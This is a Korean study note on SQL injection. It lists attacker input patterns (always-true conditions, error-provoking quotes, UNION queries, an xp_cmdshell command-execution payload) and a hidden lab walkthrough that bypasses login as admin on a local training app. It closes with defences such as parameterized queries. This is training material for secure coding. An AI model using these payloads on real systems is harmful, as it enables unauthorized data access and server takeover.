
# SQL Injection

<center><img src = "https://user-images.githubusercontent.com/76420201/106089260-ee74ed00-616a-11eb-8fe7-1ac6681d5e2e.png" ></center>

SQL Injection 이란 악의적인 사용자가 보안상의 취약점을 이용하여, 임의의 SQL 문을 주입하고 실행되게 하여 데이터베이스가 비정상적인 동작을 하도록 조작하는 행위 입니다. 인젝션 공격은 비교적 쉬운 편이고 공격에 성공할 경우 큰 피해를 입힐 수 있는 공격입니다.

- 외부 입력값을 쿼리 조작 문자열 포함 여부를 검증하지 않고 SQL문 생성 및 실행에 사용하는 경우 <br>
    - 쿼리의 의미와 구조가 변경되어서 실행
    - 의도하지 않은 데이터베이스에 대한 조작이 가능

<br>

## 공격자 패턴

1. 항상 참이 되는 입력<br>
예) `a' or 'a' = 'a`<br>
`select * from users where name = 'a' or 'a' = 'a'`<br>
-> 모든 데이터를 조회<br> 
-> 권한 밖에 데이터에 접근 가능

2. 오류를 유발하는 입력<br>
예) `a'`<br>
`select * from users where name = 'a''`<br> 
-> 구문 오류를 유발<br>
-> 시스템 오류를 통해서 시스템 내부 정도 수집에 활용

3. 추가 정보를 조회하는 입력<br>
예) hong' union select * from ... --<br>
select * from users where name = 'hong' <br>
union<br>
select * from ... --<br>

4. 시스템 명령어 실행하는 입력<br><br>
예) hong'; exec xp_cmdshell 'cmd.exe /c ipconfig'; -- <br>
`select * from users where name = 'hong'; exec xp_cmdshell 'cmd.exe /c ipconfig'; -- '`<br>
-> 해당 DBMS의 쉘 이용이 가능 = 제어권을 탈취


5. 참, 거짓을 유발하는 입력 ⇒ Blind SQL Injection

<br>

## SQL Injection을 이용한 인증과정 우회

<!-- @Attacker 가상머신에서 Proxy를 해제 후 http://winxp:8080/openeg로 접속

#1 처리 과정을 추측
사용자 입력
ID: a
PW: b

서버로 전달
http://winxp:8080/openeg/login.do?userid=a&userpw=b

서버에서 처리
select * from users where user_id = 'a' and user_pw = 'b'

#2 입력값이 검증 없이 처리에 사용되는지 여부를 확인
사용자 입력
ID: a'
PW: b'

서버로 전달
http://winxp:8080/openeg/login.do?userid=a'&userpw=b'

서버에서 처리
select * from users where user_id = 'a'' and user_pw = 'b''


HTTP Status 500 -
type Exception report

message
description The server encountered an internal error () that prevented it from fulfilling this request.

exception
org.springframework.web.util.NestedServletException: Request processing failed; nested exception is org.springframework.jdbc.BadSqlGrammarException: SqlMapClient operation; bad SQL grammar []; nested exception is com.ibatis.common.jdbc.exception.NestedSQLException:   
--- The error occurred in kr/co/openeg/lab/login/dao/login.xml.  
--- The error occurred while applying a parameter map.  
--- Check the login.loginCheck2-InlineParameterMap.  
--- Check the statement (query failed).  
--- Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'b''' at line 1
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:894)
					:

#3 수집한 정보를 이용해서 추가 공격 시도
사용자 입력
ID: a'#
PW: b'#

서버로 전달
http://winxp:8080/openeg/login.do?userid=a'#&userpw=b'#

서버에서 처리
select * from users where user_id = 'a'#' and user_pw = 'b'#'


#4 가입된 회원 정보를 조회
amdin으로 회원 가입을 시도 → 이미 가입된 회원 ⇒ admin 이라는 아이디를 사용하는 사용자가 존재


#5 admin으로 로그인을 시도
사용자 입력
ID: admin'#
PW: b'#

서버로 전달
http://winxp:8080/openeg/login.do?userid=admin'#&userpw=b'#

서버에서 처리
select * from users where user_id = 'admin'#' and user_pw = 'b'#' -->

<br>

## 방어 기법

- 쿼리 조작 문자열 포함 여부를 확인
    - 제거하고 사용
    - 안전한 형태로 바꿔서 사용
- 일정한 형태로 쿼리가 실행되는 것을 보장 = 구조화된 쿼리 실행 = 파라미터화된 쿼리 실행 = 정적 쿼리 실행
- 오류 메시지를 통제 = 오류 메시지에 시스템 정보가 포함되지 않도록 처리
- 어플리케이션에서 사용하는 DB 사용자의 권한을 최소로 부여




<details markdown="1">
<summary><b>WebGoat / String SQL Injection</b></summary>
<br>   
소스코드 ⇒ @WinXP > Eclipse > Ctrl+Shift+R ><br> 
@Attacker 가상머신에서 http://winxp:8080/WebGoat으로 접속

</details>

<details markdown="1">
<summary><b>WebGoat / Numeric SQL Injection</b></summary>
<br>   

</details>

<details markdown="1">
<summary><b>WebGoat / Blind Numeric SQL Injection</b></summary>
<br>   

</details>

<details markdown="1">
<summary><b>WebGoat / Blind String SQL Injection</b></summary>
<br>   

</details>